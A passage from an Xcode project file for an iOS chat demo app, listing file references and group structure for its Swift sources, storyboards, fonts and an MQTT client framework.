		5D41C908264340C300D33DAA /* ValidateUserNameRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidateUserNameRequest.swift; sourceTree = "<group>"; };
		5D41C90C2643425800D33DAA /* SignupRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupRequest.swift; sourceTree = "<group>"; };
		5D41C90F2643436B00D33DAA /* ValidateUserNameService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidateUserNameService.swift; sourceTree = "<group>"; };
		5D41C9132643440700D33DAA /* ObjectTranslation.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ObjectTranslation.swift; sourceTree = "<group>"; };
		5D41C9182643455700D33DAA /* CheckUsernameRepsonse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckUsernameRepsonse.swift; sourceTree = "<group>"; };
		5D41C9202643E7D500D33DAA /* UserResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserResponse.swift; sourceTree = "<group>"; };
		5D41C9232643E81700D33DAA /* SignupService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupService.swift; sourceTree = "<group>"; };
		5D41C9262643EC5100D33DAA /* LoginRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginRequest.swift; sourceTree = "<group>"; };
		5D41C92A2643EFB500D33DAA /* Login.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Login.storyboard; sourceTree = "<group>"; };
		5D41C92B2643EFB500D33DAA /* LoginRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginRouter.swift; sourceTree = "<group>"; };
		5D41C92C2643EFB500D33DAA /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		5D41C92D2643EFB500D33DAA /* LoginBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginBuilder.swift; sourceTree = "<group>"; };
		5D41C92E2643EFB500D33DAA /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		5D41C9362643F16400D33DAA /* LoginService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginService.swift; sourceTree = "<group>"; };
		5D41C93D2644643F00D33DAA /* GroupResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupResponse.swift; sourceTree = "<group>"; };
		5D41C9402644649D00D33DAA /* AllGroupRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllGroupRequest.swift; sourceTree = "<group>"; };
		5D41C9432644652900D33DAA /* AllGroupService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllGroupService.swift; sourceTree = "<group>"; };
		5D41C9462644677700D33DAA /* Groups.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Groups.storyboard; sourceTree = "<group>"; };
		5D41C9472644677700D33DAA /* GroupsRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupsRouter.swift; sourceTree = "<group>"; };
		5D41C9482644677700D33DAA /* GroupsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupsViewController.swift; sourceTree = "<group>"; };
		5D41C9492644677700D33DAA /* GroupsBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupsBuilder.swift; sourceTree = "<group>"; };
		5D41C94A2644677700D33DAA /* GroupsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupsViewModel.swift; sourceTree = "<group>"; };
		5D41C9542644696600D33DAA /* GroupCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupCell.swift; sourceTree = "<group>"; };
		5D41C9552644696600D33DAA /* GroupCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GroupCell.xib; sourceTree = "<group>"; };
		5D44E48E26448214009F8123 /* VDOTOKObject.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VDOTOKObject.swift; sourceTree = "<group>"; };
		5D458CD226551BE200AC785D /* Inter-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-Thin.ttf"; sourceTree = "<group>"; };
		5D458CD326551BE200AC785D /* Inter-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-Regular.ttf"; sourceTree = "<group>"; };
		5D458CD426551BE200AC785D /* Inter-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-Bold.ttf"; sourceTree = "<group>"; };
		5D458CD526551BE200AC785D /* Inter-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-ExtraBold.ttf"; sourceTree = "<group>"; };
		5D458CD626551BE200AC785D /* Inter-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-Black.ttf"; sourceTree = "<group>"; };
		5D458CD726551BE200AC785D /* Inter-ExtraLight.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-ExtraLight.ttf"; sourceTree = "<group>"; };
		5D458CD826551BE200AC785D /* Inter-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-Light.ttf"; sourceTree = "<group>"; };
		5D458CD926551BE300AC785D /* Inter-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-Medium.ttf"; sourceTree = "<group>"; };
		5D458CDA26551BE300AC785D /* Inter-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Inter-SemiBold.ttf"; sourceTree = "<group>"; };
		5D57CD692685E8F500873AC2 /* DeleteGroupRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeleteGroupRequest.swift; sourceTree = "<group>"; };
		5D57CD6B2685E98500873AC2 /* DeleteGroupService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeleteGroupService.swift; sourceTree = "<group>"; };
		5D57CD6D2685F29700873AC2 /* EditGroupRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditGroupRequest.swift; sourceTree = "<group>"; };
		5D57CD6F2685F3CD00873AC2 /* EditGroupService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditGroupService.swift; sourceTree = "<group>"; };
		5D57CD97268650BF00873AC2 /* vdotokCert.p12 */ = {isa = PBXFileReference; lastKnownFileType = file; name = vdotokCert.p12; path = Cert/vdotokCert.p12; sourceTree = SOURCE_ROOT; };
		5D57DAC52642964700515FEA /* Chat-Demo-IOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Chat-Demo-IOS.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		5D57DAC82642964700515FEA /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		5D57DACA2642964700515FEA /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		5D57DACC2642964700515FEA /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		5D57DACF2642964700515FEA /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		5D57DAD12642964800515FEA /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		5D57DAD42642964800515FEA /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		5D57DAD62642964800515FEA /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		5D5C26D1265D814500940856 /* AttachmentViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AttachmentViewController.swift; sourceTree = "<group>"; };
		5D5C26D2265D814500940856 /* AttachmentViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AttachmentViewController.xib; sourceTree = "<group>"; };
		5D60CAE3265B894300146F47 /* AllUsersReponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllUsersReponse.swift; sourceTree = "<group>"; };
		5D60CAE6265B89C700146F47 /* AllUserRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllUserRequest.swift; sourceTree = "<group>"; };
		5D60CAE9265B8A1400146F47 /* AllUsersService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllUsersService.swift; sourceTree = "<group>"; };
		5D66896426613C10000132EC /* MessageModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessageModel.swift; sourceTree = "<group>"; };
		5D6F4CD4265E20AA00E21E52 /* ImagePicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePicker.swift; sourceTree = "<group>"; };
		5D6F4CD7265E48DC00E21E52 /* DocumentPicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DocumentPicker.swift; sourceTree = "<group>"; };
		5D6F4CD9265E721200E21E52 /* AudioVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AudioVC.swift; sourceTree = "<group>"; };
		5D6F4CDA265E721200E21E52 /* AudioVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AudioVC.xib; sourceTree = "<group>"; };
		5D6F4CE1265EE0C500E21E52 /* OutgoingAudioCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OutgoingAudioCell.swift; sourceTree = "<group>"; };
		5D6F4CE2265EE0C500E21E52 /* OutgoingAudioCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OutgoingAudioCell.xib; sourceTree = "<group>"; };
		5D6F4CE5265EE0D800E21E52 /* IncomingAudioCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingAudioCell.swift; sourceTree = "<group>"; };
		5D6F4CE6265EE0D800E21E52 /* IncomingAudioCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingAudioCell.xib; sourceTree = "<group>"; };
		5D794A07265BE19600837B91 /* CreateGroupRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupRequest.swift; sourceTree = "<group>"; };
		5D794A09265BE1F700837B91 /* CreateGroupService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupService.swift; sourceTree = "<group>"; };
		5D794A0B265BE2A700837B91 /* CreateGroupResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupResponse.swift; sourceTree = "<group>"; };
		5D91F7272664BCC800F12715 /* Notification+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Notification+Extension.swift"; sourceTree = "<group>"; };
		5D91F73F2665556A00F12715 /* OutgoingAttachementCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OutgoingAttachementCell.swift; sourceTree = "<group>"; };
		5D91F7402665556A00F12715 /* OutgoingAttachementCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OutgoingAttachementCell.xib; sourceTree = "<group>"; };
		5D91F7432665557B00F12715 /* IncomingAttachmentCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingAttachmentCell.swift; sourceTree = "<group>"; };
		5D91F7442665557B00F12715 /* IncomingAttachmentCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingAttachmentCell.xib; sourceTree = "<group>"; };
		5D91F74726657DF100F12715 /* IncomingImageCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingImageCell.swift; sourceTree = "<group>"; };
		5D91F74826657DF100F12715 /* IncomingImageCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingImageCell.xib; sourceTree = "<group>"; };
		5D91F74B2665852200F12715 /* outgoingImageCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = outgoingImageCell.swift; sourceTree = "<group>"; };
		5D91F74C2665852200F12715 /* outgoingImageCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = outgoingImageCell.xib; sourceTree = "<group>"; };
		5D91F7862666652000F12715 /* Data+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Data+Extension.swift"; sourceTree = "<group>"; };
		5D91F79A2668F6CB00F12715 /* UInt+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UInt+Extension.swift"; sourceTree = "<group>"; };
		5D91F79D2669064F00F12715 /* AuthenticationRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthenticationRequest.swift; sourceTree = "<group>"; };
		5D91F79F2669095900F12715 /* AuthenticationService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthenticationService.swift; sourceTree = "<group>"; };
		5D91F7A1266CB1F100F12715 /* TextView+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "TextView+Extensions.swift"; sourceTree = "<group>"; };
		5DA2BAAC2656F359000772FC /* YellowButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YellowButton.swift; sourceTree = "<group>"; };
		5DA2BAB02656F7FA000772FC /* CreateGroupPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupPopUp.swift; sourceTree = "<group>"; };
		5DA2BAB12656F7FA000772FC /* CreateGroupPopUp.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreateGroupPopUp.xib; sourceTree = "<group>"; };
		5DD5B97226449DBD00F04599 /* CustomButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomButton.swift; sourceTree = "<group>"; };
		5DD5B97626449F6800F04599 /* Colors.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Colors.xcassets; sourceTree = "<group>"; };
		5DD5B97A2644AE3800F04599 /* Reachability.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Reachability.swift; sourceTree = "<group>"; };
		5DDC5C312656617500663338 /* Poppins-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Regular.ttf"; sourceTree = "<group>"; };
		5DDC5C332656617500663338 /* Poppins-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Black.ttf"; sourceTree = "<group>"; };
		5DDC5C352656617500663338 /* Poppins-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-SemiBold.ttf"; sourceTree = "<group>"; };
		5DDC5C392656617600663338 /* Poppins-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Medium.ttf"; sourceTree = "<group>"; };
		5DDC5C3A2656617600663338 /* Poppins-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Bold.ttf"; sourceTree = "<group>"; };
		5DDC5C3B2656617600663338 /* Poppins-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-ExtraBold.ttf"; sourceTree = "<group>"; };
		5DDC5C3C2656617600663338 /* Poppins-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Light.ttf"; sourceTree = "<group>"; };
		5DDC5C3D2656617600663338 /* Poppins-ExtraLight.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-ExtraLight.ttf"; sourceTree = "<group>"; };
		5DDC5C3F2656617600663338 /* Poppins-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Thin.ttf"; sourceTree = "<group>"; };
		5DDC5C572656628800663338 /* IndigoButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IndigoButton.swift; sourceTree = "<group>"; };
		5DDC5C5A2656636100663338 /* NextButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NextButton.swift; sourceTree = "<group>"; };
		5DDC5C5D2656684D00663338 /* Contact.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Contact.storyboard; sourceTree = "<group>"; };
		5DDC5C5E2656684D00663338 /* ContactRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactRouter.swift; sourceTree = "<group>"; };
		5DDC5C5F2656684D00663338 /* ContactViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewController.swift; sourceTree = "<group>"; };
		5DDC5C602656684D00663338 /* ContactBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactBuilder.swift; sourceTree = "<group>"; };
		5DDC5C612656684D00663338 /* ContactViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewModel.swift; sourceTree = "<group>"; };
		5DDC5C692656714800663338 /* ContactCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactCell.swift; sourceTree = "<group>"; };
		5DDC5C6A2656714800663338 /* ContactCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ContactCell.xib; sourceTree = "<group>"; };
		5DDC5C7126567A7900663338 /* CreateGroup.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = CreateGroup.storyboard; sourceTree = "<group>"; };
		5DDC5C7226567A7900663338 /* CreateGroupRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupRouter.swift; sourceTree = "<group>"; };
		5DDC5C7326567A7900663338 /* CreateGroupViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupViewController.swift; sourceTree = "<group>"; };
		5DDC5C7426567A7900663338 /* CreateGroupBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupBuilder.swift; sourceTree = "<group>"; };
		5DDC5C7526567A7900663338 /* CreateGroupViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupViewModel.swift; sourceTree = "<group>"; };
		5DDC5C7E26567D9700663338 /* CreateGroupCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateGroupCell.swift; sourceTree = "<group>"; };
		5DDC5C7F26567D9700663338 /* CreateGroupCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreateGroupCell.xib; sourceTree = "<group>"; };
		5DF35FD026550966000EB9ED /* OutgoingTextCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OutgoingTextCell.swift; sourceTree = "<group>"; };
		5DF35FD126550966000EB9ED /* OutgoingTextCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OutgoingTextCell.xib; sourceTree = "<group>"; };
		5DF35FD626550974000EB9ED /* IncomingTextCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingTextCell.swift; sourceTree = "<group>"; };
		5DF35FD726550974000EB9ED /* IncomingTextCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingTextCell.xib; sourceTree = "<group>"; };
		5DF35FDB265518E5000EB9ED /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
		5DF36003265519D1000EB9ED /* Color+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Color+Extension.swift"; sourceTree = "<group>"; };
		5DFDB72E264486310005A141 /* ProgressHud.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProgressHud.swift; sourceTree = "<group>"; };
		5DFE71CC2642AD8200F22B66 /* Service.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Service.swift; sourceTree = "<group>"; };
		5DFE71D02642ADA700F22B66 /* BaseDataStore.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseDataStore.swift; sourceTree = "<group>"; };
		5DFE71D32642ADBA00F22B66 /* ApiRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ApiRequest.swift; sourceTree = "<group>"; };
		5DFE71D92642AE4000F22B66 /* SignUp.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = SignUp.storyboard; sourceTree = "<group>"; };
		5DFE71DA2642AE4000F22B66 /* SignUpRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpRouter.swift; sourceTree = "<group>"; };
		5DFE71DB2642AE4000F22B66 /* SignUpViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewController.swift; sourceTree = "<group>"; };
		5DFE71DC2642AE4000F22B66 /* SignUpBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpBuilder.swift; sourceTree = "<group>"; };
		5DFE71DD2642AE4000F22B66 /* SignUpViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewModel.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		5D57DAC22642964700515FEA /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		18D01BF62686145B00DE549A /* Products */ = {
			isa = PBXGroup;
			children = (
				18D01BFB2686145B00DE549A /* MqttClient.framework */,
				18D01BFD2686145B00DE549A /* MqttClientTests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		5D11F2482652806C0038F05F /* Home */ = {
			isa = PBXGroup;
			children = (
				5D11F249265280820038F05F /* Home.storyboard */,
				5D11F24A265280820038F05F /* HomeRouter.swift */,
				5D11F24B265280820038F05F /* HomeViewController.swift */,
				5D11F24C265280820038F05F /* HomeBuilder.swift */,
				5D11F24D265280820038F05F /* HomeViewModel.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		5D11F25A26528D420038F05F /* Fonts */ = {
			isa = PBXGroup;
			children = (
				5DDC5C2D2656614C00663338 /* Poppins */,
				5D458CD126551BBE00AC785D /* Inter */,
				5D11F25B26528D760038F05F /* Manrope */,
			);
			path = Fonts;
			sourceTree = "<group>";
		};
		5D11F25B26528D760038F05F /* Manrope */ = {
			isa = PBXGroup;
			children = (
				5D11F25C26528D920038F05F /* Manrope-Bold.ttf */,
				5D11F25E26528D920038F05F /* Manrope-ExtraBold.ttf */,
				5D11F25F26528D930038F05F /* Manrope-ExtraLight.ttf */,
				5D11F25D26528D920038F05F /* Manrope-Light.ttf */,
				5D11F26026528D930038F05F /* Manrope-Medium.ttf */,
				5D11F26126528D930038F05F /* Manrope-Regular.ttf */,
				5D11F26226528D930038F05F /* Manrope-SemiBold.ttf */,
			);
			path = Manrope;
			sourceTree = "<group>";
		};
		5D11F26B2653D54A0038F05F /* Chat */ = {
			isa = PBXGroup;
			children = (
				5D5C26D0265D80E800940856 /* Popup */,
				5DF35FCF26550943000EB9ED /* ChatCells */,
				5D11F26D2653D56A0038F05F /* ChatScreen.storyboard */,
				5D11F26E2653D56A0038F05F /* ChatScreenRouter.swift */,
				5D11F26F2653D56A0038F05F /* ChatScreenViewController.swift */,
				5D11F2702653D56A0038F05F /* ChatScreenBuilder.swift */,
				5D11F2712653D56A0038F05F /* ChatScreenViewModel.swift */,
			);
			path = Chat;
			sourceTree = "<group>";
		};
		5D41C9052643402D00D33DAA /* DataStore */ = {
			isa = PBXGroup;
			children = (
				5D41C9072643403C00D33DAA /* Request */,
				5D41C9062643403600D33DAA /* Service */,
			);
			path = DataStore;
			sourceTree = "<group>";
		};
		5D41C9062643403600D33DAA /* Service */ = {
			isa = PBXGroup;
			children = (
				5D41C90F2643436B00D33DAA /* ValidateUserNameService.swift */,
				5D41C9232643E81700D33DAA /* SignupService.swift */,
				5D41C9362643F16400D33DAA /* LoginService.swift */,
				5D41C9432644652900D33DAA /* AllGroupService.swift */,
				5D60CAE9265B8A1400146F47 /* AllUsersService.swift */,
				5D794A09265BE1F700837B91 /* CreateGroupService.swift */,
				5D91F79F2669095900F12715 /* AuthenticationService.swift */,
				5D57CD6B2685E98500873AC2 /* DeleteGroupService.swift */,
				5D57CD6F2685F3CD00873AC2 /* EditGroupService.swift */,
			);
			path = Service;
			sourceTree = "<group>";
		};
		5D41C9072643403C00D33DAA /* Request */ = {
			isa = PBXGroup;
			children = (
				5D41C908264340C300D33DAA /* ValidateUserNameRequest.swift */,
				5D41C90C2643425800D33DAA /* SignupRequest.swift */,
				5D41C9262643EC5100D33DAA /* LoginRequest.swift */,
				5D41C9402644649D00D33DAA /* AllGroupRequest.swift */,
				5D60CAE6265B89C700146F47 /* AllUserRequest.swift */,
				5D794A07265BE19600837B91 /* CreateGroupRequest.swift */,
				5D91F79D2669064F00F12715 /* AuthenticationRequest.swift */,
				5D57CD692685E8F500873AC2 /* DeleteGroupRequest.swift */,
				5D57CD6D2685F29700873AC2 /* EditGroupRequest.swift */,
				0F2D2B44298BB1A700E2559A /* MultipartFormDataRequest.swift */,
			);
			path = Request;
			sourceTree = "<group>";
		};
		5D41C912264343E300D33DAA /* Translation */ = {
			isa = PBXGroup;
			children = (
				5D41C9132643440700D33DAA /* ObjectTranslation.swift */,
			);
			path = Translation;
			sourceTree = "<group>";
		};
		5D41C9172643454700D33DAA /* Model */ = {
			isa = PBXGroup;
			children = (
				5D41C9182643455700D33DAA /* CheckUsernameRepsonse.swift */,
				5D41C9202643E7D500D33DAA /* UserResponse.swift */,
				5D41C93D2644643F00D33DAA /* GroupResponse.swift */,
				5D60CAE3265B894300146F47 /* AllUsersReponse.swift */,
				5D794A0B265BE2A700837B91 /* CreateGroupResponse.swift */,
				5D66896426613C10000132EC /* MessageModel.swift */,
				49BF44F1298933A800748AF2 /* UploadFileResponse.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		5D41C9292643EFA500D33DAA /* Login */ = {
			isa = PBXGroup;
			children = (
				5D41C92A2643EFB500D33DAA /* Login.storyboard */,
				5D41C92B2643EFB500D33DAA /* LoginRouter.swift */,
				5D41C92C2643EFB500D33DAA /* LoginViewController.swift */,
				5D41C92D2643EFB500D33DAA /* LoginBuilder.swift */,
				5D41C92E2643EFB500D33DAA /* LoginViewModel.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		5D41C9512644690500D33DAA /* Groups */ = {
			isa = PBXGroup;
			children = (
				5D41C9532644694600D33DAA /* Cell */,
				5D41C9462644677700D33DAA /* Groups.storyboard */,
				5D41C9472644677700D33DAA /* GroupsRouter.swift */,
				5D41C9482644677700D33DAA /* GroupsViewController.swift */,
				5D41C9492644677700D33DAA /* GroupsBuilder.swift */,
				5D41C94A2644677700D33DAA /* GroupsViewModel.swift */,
			);
			path = Groups;
			sourceTree = "<group>";
		};
		5D41C9532644694600D33DAA /* Cell */ = {
			isa = PBXGroup;
			children = (
				5D41C9542644696600D33DAA /* GroupCell.swift */,
				5D41C9552644696600D33DAA /* GroupCell.xib */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		5D44E48C264481E8009F8123 /* Common */ = {
			isa = PBXGroup;
			children = (
				5D7B72E3265684AF00B0779A /* Popup */,
				5D11F25A26528D420038F05F /* Fonts */,
				5DD5B97126449DAB00F04599 /* UIKit */,
				5D44E48D264481F1009F8123 /* UserDefaults */,
				5DFDB72E264486310005A141 /* ProgressHud.swift */,
				5DD5B97A2644AE3800F04599 /* Reachability.swift */,
				5DF35FDB265518E5000EB9ED /* Constants.swift */,
			);
			path = Common;
			sourceTree = "<group>";
		};
		5D44E48D264481F1009F8123 /* UserDefaults */ = {
			isa = PBXGroup;
			children = (
				5D44E48E26448214009F8123 /* VDOTOKObject.swift */,
			);
			path = UserDefaults;
			sourceTree = "<group>";
		};
		5D458CD126551BBE00AC785D /* Inter */ = {
			isa = PBXGroup;
			children = (
				5D458CD626551BE200AC785D /* Inter-Black.ttf */,
				5D458CD426551BE200AC785D /* Inter-Bold.ttf */,
				5D458CD526551BE200AC785D /* Inter-ExtraBold.ttf */,
				5D458CD726551BE200AC785D /* Inter-ExtraLight.ttf */,
				5D458CD826551BE200AC785D /* Inter-Light.ttf */,
				5D458CD926551BE300AC785D /* Inter-Medium.ttf */,
				5D458CD326551BE200AC785D /* Inter-Regular.ttf */,
				5D458CDA26551BE300AC785D /* Inter-SemiBold.ttf */,
				5D458CD226551BE200AC785D /* Inter-Thin.ttf */,
			);
			path = Inter;
			sourceTree = "<group>";
		};
		5D57CD8726860DEF00873AC2 /* Recovered References */ = {
			isa = PBXGroup;
			children = (
			);
			name = "Recovered References";
			sourceTree = "<group>";
		};
		5D57DABC2642964700515FEA = {
			isa = PBXGroup;
			children = (
				5D57DAC72642964700515FEA /* Chat-Demo-IOS */,
				5D57DAC62642964700515FEA /* Products */,
				E1E9DC5D5EB54924F74CB46E /* Pods */,
				5D57CD8726860DEF00873AC2 /* Recovered References */,
			);
			sourceTree = "<group>";
		};
